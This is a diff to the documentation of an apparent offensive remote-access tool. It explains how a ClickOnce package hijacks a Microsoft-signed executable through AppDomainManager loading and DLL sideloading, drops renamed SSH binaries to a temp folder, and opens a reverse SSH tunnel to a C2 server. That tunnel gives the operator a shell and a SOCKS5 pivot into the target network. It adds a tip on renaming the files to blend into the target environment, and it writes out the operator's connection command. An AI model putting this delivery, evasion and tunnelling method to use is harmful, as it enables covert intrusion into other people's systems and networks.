@@ -146,13 +146,15 @@ sequenceDiagram
 
 | File | Role |
 |------|------|
-| `boltd.exe` | Miniature SSH daemon — listens on `127.0.0.1:<tunnel_port>` |
-| `boltcon.exe` | SSH client — connects outbound to C2, creates the reverse tunnel |
-| `libcrypto.dll` | Crypto library required by boltd/boltcon |
-| `boltd-hostkey` | Per-build RSA-2048 host key for boltd (unique per deployment) |
-| `boltd-config` | SSH daemon config (port, listen address, auth settings) |
+| `sshd.exe` | Miniature SSH daemon — listens on `127.0.0.1:<tunnel_port>` |
+| `ssh.exe` | SSH client — connects outbound to C2, creates the reverse tunnel |
+| `libcrypto.dll` | Crypto library required by sshd/ssh |
+| `sshd-hostkey` | Per-build RSA-2048 host key for sshd (unique per deployment) |
+| `sshd-config` | SSH daemon config (port, listen address, auth settings) |
 | `authorized_keys` | Per-build operator public key (who can SSH into the tunnel) |
-| `{ssh_user}_key` | Global outbound private key (boltcon authenticates to C2 with this) |
+| `{ssh_user}_key` | Global outbound private key (ssh authenticates to C2 with this) |
+
+> **Files prefix** — the filenames above use the default prefix `bolt` (`boltd.exe`, `boltcon.exe`, `boltd-hostkey`, etc.). You can change this from the UI under **Files Prefix** before building. For example, setting it to `shadow` produces `shadowd.exe`, `shadowcon.exe`, `shadowd-hostkey`, and so on — useful for blending into the target environment.
 
 ### Step 3 — Delivery and tunnel establishment
 
@@ -168,10 +170,10 @@ sequenceDiagram
     Target->>Caddy: GET payload.application
     Caddy-->>Target: ClickOnce manifest + all .deploy files
 
-    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager loads Bolthole.dll<br/>DLL extracts BoltFiles to %TEMP%<br/>Starts boltd on 127.0.0.1:<tunnel_port><br/>Starts boltcon — tries ports 443 → 80 → 22 → ...
+    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager loads Bolthole.dll<br/>DLL extracts BoltFiles to %TEMP%<br/>Starts sshd on 127.0.0.1:<tunnel_port><br/>Starts ssh client — tries ports 443 → 80 → 22 → ...
 
     Target->>C2: Reverse SSH tunnel established
-    Note over C2: Tunnel port (e.g. 31332) now reachable<br/>SOCKS5 proxy bound on configured socks_port
+    Note over C2: SSH tunnel port (e.g. 31332) now reachable<br/>SOCKS5 proxy bound on configured socks_port
 
     Operator->>C2: ssh -i operator_key -p 31332 user@c2
     C2-->>Operator: Interactive shell on target machine
@@ -222,8 +224,8 @@ flowchart LR
 | **ClickOnce** | Microsoft deployment technology that installs and runs .NET apps from a URL — no installer needed |
 | **AppDomainManager hijack** | A `.config` file alongside the EXE redirects the .NET runtime to load a custom DLL as the AppDomainManager, giving code execution inside a trusted process |
 | **Sideloading** | Loading a custom DLL by placing it next to a legitimate signed binary that will load it automatically |
-| **boltd** | Minimal SSH daemon bundled in the package, runs locally on the target |
-| **boltcon** | SSH client bundled in the package, connects outbound from target to C2 |
+| **sshd** | Minimal SSH daemon bundled in the package, runs locally on the target |
+| **ssh** | SSH client bundled in the package, connects outbound from target to C2 |
 | **Reverse SSH tunnel** | The target initiates the outbound connection (bypassing inbound firewall rules); the operator connects inbound through that tunnel |
 | **SOCKS5 pivot** | SSH dynamic port forwarding that lets the operator route arbitrary TCP traffic through the tunnel into the target network |
 | **Operator keypair** | Per-build ECDSA keypair — private key goes to the operator, public key is embedded in `authorized_keys` inside the package |
